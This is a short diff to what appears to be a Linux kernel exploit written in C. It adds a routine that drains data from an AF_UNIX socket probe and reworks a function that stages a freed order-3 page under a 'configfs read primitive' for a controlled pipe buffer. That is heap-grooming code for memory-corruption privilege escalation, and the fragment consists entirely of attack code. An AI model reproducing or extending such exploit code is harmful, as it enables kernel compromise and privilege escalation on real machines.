@@ -192,6 +192,22 @@ static int pipe_alloc_order3_probe(struct pipe_order3_state *state,
   return sent == PIPE_ORDER3_STREAM_LEN;
 }
 
+static int pipe_drain_order3_probe(struct pipe_order3_state *state,
+                                   int index) {
+  struct pipe_order3_probe *probe = &state->probes[index];
+  size_t drained = 0;
+  while (drained < PIPE_ORDER3_STREAM_LEN) {
+    ssize_t got = recv(probe->sv[1], state->payload + drained,
+                       PIPE_ORDER3_STREAM_LEN - drained, 0);
+    if (got < 0 && errno == EINTR)
+      continue;
+    if (got <= 0)
+      break;
+    drained += (size_t)got;
+  }
+  return drained == PIPE_ORDER3_STREAM_LEN;
+}
+
 /* Drain order-3 buddy lists with one-fragment AF_UNIX stream skbs while the
  * configfs read primitive watches the exact released page. Socket objects are
  * created before release so only the skb head and one order-3 page are
@@ -229,14 +245,16 @@ static int pipe_stage_exact_order3(uintptr_t base,
       allocated++;
   }
 
+  int drained = pipe_drain_order3_probe(state, captured);
   close(state->probes[captured].sv[0]);
   close(state->probes[captured].sv[1]);
   state->probes[captured].sv[0] = -1;
   state->probes[captured].sv[1] = -1;
-  pr_info("pipe order-3 oracle captured probe=%d allocated=%d guard=%d\n",
+  pr_info("pipe order-3 oracle captured probe=%d allocated=%d guard=%d "
+          "drained=%d\n",
           captured, allocated,
-          state->probes[guard].sv[0] >= 0 ? guard : -1);
-  return 1;
+          state->probes[guard].sv[0] >= 0 ? guard : -1, drained);
+  return drained;
 }
 
 static uintptr_t prepare_controlled_pipe_buffer_page_child(void) {
